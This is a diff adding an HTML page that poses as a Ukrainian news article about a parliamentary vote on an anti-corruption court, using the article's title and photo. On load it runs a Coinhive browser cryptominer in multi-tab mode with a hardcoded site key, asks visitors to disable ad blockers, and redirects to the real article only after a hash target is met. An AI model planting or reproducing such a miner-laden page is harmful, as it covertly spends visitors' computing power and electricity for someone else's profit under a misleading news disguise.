@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<!-- saved from url=(0021)https://cnhv.co/2ya7j -->
+<html lang="en-us"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<title>Парубий назвал дату голосования за Антикорсуд</title>
+	<link rel="stylesheet" type="text/css" href="./cnhv.co – redirecting…_files/shortlink.css">
+	
+	<script type="text/javascript" src="./cnhv.co – redirecting…_files/coinhive.min.js.завантаження"></script>
+	<meta name="viewport" content="width=400">
+	<meta http-equiv="Refresh" content="15; URL=https://korrespondent.net/ukraine/politics/3977053-parubyi-nazval-datu-holosovanyia-za-antykorsud">
+</head>
+<body>
+<img src="https://kor.ill.in.ua/m/610x385/2157366.jpg" alt="Парубий назвал дату голосования за Антикорсуд" class="post-item__big-photo-img">
+<div class="content">
+	<h1>proof of work required – redirecting shortly</h1>
+
+	<div class="progress-bar">
+		<div id="progress" style="width: 1.3%;"></div>
+	</div>
+
+	<div id="blk-warning" class="warn" style="display: none">
+		Library failed to load. <strong>Please disable adblock!</strong>
+	</div>
+
+	powered by <a href="https://coinhive.com/">
+		<img src="./cnhv.co – redirecting…_files/coinhive-icon.png" class="icon">
+		coinhive
+	</a>
+</div>
+
+<script type="text/javascript">
+	if (!window.CoinHive) {
+		document.getElementById('blk-warning').style.display = 'block';
+	}
+
+	var $progress = document.getElementById('progress');
+	var target = 1024;
+	var totalHashes = 0;
+	var updateInterval = null;
+
+	var miner = new CoinHive.Token('ZMZBSiFJrEph6Cw3WVNX4VoEEtr1coQ2', target);
+	miner.on('accepted', function(params){
+		if (params.hashes >= target) {
+			clearInterval(updateInterval);
+			$progress.style.width = '100%';
+
+			var ts = Date.now();
+			var xhr = new XMLHttpRequest();
+			xhr.onreadystatechange = function() {
+				if (xhr.readyState === xhr.DONE){
+					var now = Date.now();
+					var url = JSON.parse(xhr.responseText).url;
+					if (now-ts < 200) {
+						var wait = 275 - (now-ts);
+						setTimeout(function(){window.location.href = url;}, wait);
+					}
+					else {
+						window.location.href = url;
+					}
+				}
+			};
+			xhr.open('POST', '/2ya7j');
+			xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+			xhr.send('token='+encodeURIComponent(miner.getToken()));
+		}
+	});
+
+	updateInterval = setInterval(function(){
+		var p = miner.getTotalHashes(true) / target;
+		var progress = (p*p)/(p*p + 0.2) + 0.01;
+		$progress.style.width = (Math.ceil(progress*1000)/10)+'%';
+	}, 250);
+	miner.start(CoinHive.FORCE_MULTI_TAB);
+</script>
+
+<img src="2.gif" alt="load">
+
+</body></html>
